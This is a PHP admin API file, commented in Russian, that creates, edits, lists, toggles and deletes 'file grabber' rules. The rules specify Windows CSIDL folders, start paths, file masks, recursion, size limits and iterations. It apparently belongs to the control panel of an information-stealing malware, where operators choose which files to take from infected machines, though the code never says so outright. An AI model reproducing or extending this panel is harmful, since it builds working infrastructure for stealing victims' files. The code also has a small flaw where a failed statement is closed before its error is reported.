<?php

include_once "../../config.php";
include_once "../app/functions.php";
include_once "../app/managers/AccountManager.php";

session_start();
header('Content-Type: application/json; charset=utf-8');

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    echo json_encode(['error' => 'do not have permission to use this method']);
    exit();
}

$method                 = isset($_POST["method"]) ? $_POST["method"] : null;

$page                   = isset($_POST["page"]) ? $_POST["page"] : 1;
$draw                   = isset($_POST['draw']) ? intval($_POST['draw']) : 0;
$start                  = isset($_POST['start']) ? intval($_POST['start']) : 0;
$length                 = isset($_POST['length']) ? intval($_POST['length']) : 10;

$rule_id                = isset($_POST['rule_id']) ? intval($_POST['rule_id']) : 0;
$rule_name              = isset($_POST["rule_name"]) ? $_POST["rule_name"] : null;
$rule_csidl             = isset($_POST['rule_csidl']) ? intval($_POST['rule_csidl']) : 0;
$rule_start_path        = isset($_POST["rule_start_path"]) ? $_POST["rule_start_path"] : null;
$rule_masks             = isset($_POST["rule_masks"]) ? $_POST["rule_masks"] : null;
$rule_recursive         = isset($_POST['rule_recursive']) ? intval($_POST['rule_recursive']) : 0;
$rule_iterations        = isset($_POST['rule_iterations']) ? intval($_POST['rule_iterations']) : 0;
$rule_max_size          = isset($_POST['rule_max_size']) ? intval($_POST['rule_max_size']) : 0;

$rule_active            = isset($_POST["rule_active"]) ? $_POST["rule_active"] : null;

/**
 * check actions
 */
if($method != null)
{
    switch($method)
    {
        case "get_rules":
            getRules($page, $draw, $start, $length);
            break;

        case "create_rule":
            CreateRule($rule_name, $rule_csidl, $rule_start_path, $rule_masks, $rule_recursive, $rule_iterations, $rule_max_size);
            break;

        case "delete_rule":
            DeleteRule($rule_id);
            break;

        case "change_status":
            ChangeStatus($rule_id, $rule_active);
            break;

        case "get_rule":
            getRule($rule_id);
            break;

        case "edit_rule":
            EditRule($rule_id, $rule_name, $rule_csidl, $rule_start_path, $rule_masks, $rule_recursive, $rule_iterations, $rule_max_size);
            break;
    
        default:
            exit(0);
            break;
    }
}

function getRules($page, $draw, $start, $length) 
{
    // Подключение к базе данных (функция ConnectDB должна возвращать mysqli-подключение)
    $link = ConnectDB();
    
    $conditions = [];
    
    // Формирование условия WHERE
    $whereClause = '';
    if (!empty($conditions)) {
        $whereClause = ' WHERE ' . implode(' AND ', $conditions);
    }
    
    // Подсчёт общего количества записей, удовлетворяющих условиям
    $countQuery = "SELECT COUNT(*) AS total FROM `grabber`" . $whereClause;
    $countResult = $link->query($countQuery);
    $totalRecords = 0;
    if ($countResult) {
        $row = $countResult->fetch_assoc();
        $totalRecords = (int)$row['total'];
    }
    
    $limitStart = $start;
    $limitCount = (int)$length;
    
    // Формирование основного запроса для выборки записей
    $query = "SELECT * FROM `grabber`" . $whereClause . " ORDER BY `rule_id` DESC LIMIT {$limitStart}, {$limitCount}";
    $result = $link->query($query);
    
    $data = [];
    while ($row = $result->fetch_assoc()) {
        $data[] = [
            'rule_id'               => $row['rule_id'],
            'active'                => $row['active'],
            'name'                  => $row['name'],
            'csidl'                 => $row['csidl'],
            'start_path'            => $row['start_path'],
            'masks'                 => $row['masks'],
            'recursive'             => $row['recursive'],
            'max_size'              => $row['max_size'],
            'iterations'            => $row['iterations'],
        ];
    }
    
    // Вычисляем общее число страниц
    $total_pages = ($limitCount > 0) ? ceil($totalRecords / $limitCount) : 0;
    
    // Формирование ответа для DataTables
    $response = [
        "draw"            => $draw,
        "recordsTotal"    => $totalRecords,
        "recordsFiltered" => $totalRecords,
        "current_page"    => $page,
        "total_pages"     => $total_pages,
        "data"            => $data
    ];
    
    echo json_encode($response);
    exit();
}

function CreateRule($rule_name, $rule_csidl, $rule_start_path, $rule_masks, $rule_recursive, $rule_iterations, $rule_max_size)
{
    $link = ConnectDB();

    if(strlen($rule_start_path)> 0)
    {
        $rule_start_path = "\\". $rule_start_path ."\\";
    }

    $stmt = $link->prepare("INSERT INTO `grabber`(`active`, `name`, `type`, `csidl`, `start_path`, `masks`, `recursive`, `max_size`, `iterations`) VALUES (1, ?, 2, ?, ?, ?, ?, ?, ?)");
    
    if (!$stmt) 
    {
        $stmt->close();
        echo json_encode(['error' => 'Error preparing SELECT: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("sissiii", $rule_name, $rule_csidl, $rule_start_path, $rule_masks, $rule_recursive, $rule_max_size, $rule_iterations);
    
    if ($stmt->execute()) 
    {
        echo json_encode(['success' => 'Grabber rule created']);
        $stmt->close();
        exit();
    } 
    else
    {
        echo json_encode(['error' => 'Error adding grabber rule']);
        $stmt->close();
        exit();
    }
    $stmt->close();
}

function DeleteRule($rule_id)
{
    $link = ConnectDB();
    
    // Проверяем, передан ли идентификатор правила
    if (empty($rule_id)) {
        echo json_encode(['error' => 'No rule ID provided']);
        exit();
    }
    
    // Подготовка запроса на удаление правила по id
    $stmt = $link->prepare("DELETE FROM grabber WHERE rule_id = ?");
    if (!$stmt) {
        echo json_encode(['error' => 'Error preparing DELETE statement: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("i", $rule_id);
    if (!$stmt->execute()) {
        echo json_encode(['error' => 'Error executing DELETE: ' . $stmt->error]);
        exit();
    }
    
    // Если ни одна запись не удалена, правило с таким id не найдено
    if ($stmt->affected_rows === 0) 
    {
        echo json_encode(['error' => 'No rule found with provided ID']);
        exit();
    }
    
    $stmt->close();
    
    echo json_encode(['success' => 'File Grabber rule deleted']);
    exit();
}

function ChangeStatus($rule_id, $rule_active)
{
    $link = ConnectDB();
    
    // Проверяем, передан ли идентификатор правила и значение активного состояния
    if (empty($rule_id) || !isset($rule_active)) 
    {
        echo json_encode(['error' => 'No rule ID or active status provided']);
        exit();
    }
    
    // Подготовка запроса на обновление поля active для записи с заданным rule_id
    $stmt = $link->prepare("UPDATE grabber SET active = ? WHERE rule_id = ?");
    
    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing UPDATE statement: ' . $link->error]);
        exit();
    }
    
    // Привязка параметров: active как целое число (i), rule_id также как целое число (i)
    $stmt->bind_param("ii", $rule_active, $rule_id);
    
    // Выполнение запроса
    if (!$stmt->execute()) 
    {
        echo json_encode(['error' => 'Error executing UPDATE: ' . $stmt->error]);
        exit();
    }
    
    // Если ни одна строка не обновлена, правило с таким id не найдено
    if ($stmt->affected_rows === 0) 
    {
        echo json_encode(['error' => 'No rule found with provided ID']);
        exit();
    }
    
    $stmt->close();
    
    echo json_encode(['success' => 'File Grabber rule status updated']);
    exit();
}

function getRule($rule_id)
{
    $link = ConnectDB();

    $rule_id = mysqli_real_escape_string($link, $rule_id);

    $rule = $link->query("SELECT * FROM `grabber` WHERE `rule_id`='$rule_id'")->fetch_array();

    $data = [];

    if($rule != null)
    {
        $data["rule_id"]            = $rule["rule_id"];
        $data["active"]             = $rule["active"];
        $data["name"]               = $rule["name"];
        $data["csidl"]              = $rule["csidl"];
        $data["start_path"]         = $rule["start_path"];
        $data["masks"]              = $rule["masks"];
        $data["recursive"]          = $rule["recursive"];
        $data["max_size"]           = $rule["max_size"];
        $data["iterations"]         = $rule["iterations"];
    }
    else
    {
        echo json_encode(['error' => 'rule not found']);
        exit();
    }

    echo json_encode(['success' => true, 'data' => $data]);
}

function EditRule($rule_id, $rule_name, $rule_csidl, $rule_start_path, $rule_masks, $rule_recursive, $rule_iterations, $rule_max_size)
{
    $link = ConnectDB();

    if(strlen($rule_start_path) > 0) 
    {
        $rule_start_path = "\\" . $rule_start_path . "\\";
    }

    $stmt = $link->prepare("UPDATE `grabber` SET `name` = ?, `csidl` = ?, `start_path` = ?, `masks` = ?, `recursive` = ?, `max_size` = ?, `iterations` = ? WHERE `rule_id` = ?");
    
    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing UPDATE: ' . $link->error]);
        exit();
    }

    $stmt->bind_param("sissiiii", $rule_name, $rule_csidl, $rule_start_path, $rule_masks, $rule_recursive, $rule_max_size, $rule_iterations, $rule_id);

    if ($stmt->execute()) 
    {
        echo json_encode(['success' => 'Rule updated successfully']);
    } 
    else 
    {
        echo json_encode(['error' => 'Error updating rule: ' . $stmt->error]);
    }
    
    $stmt->close();
    exit();
}

?>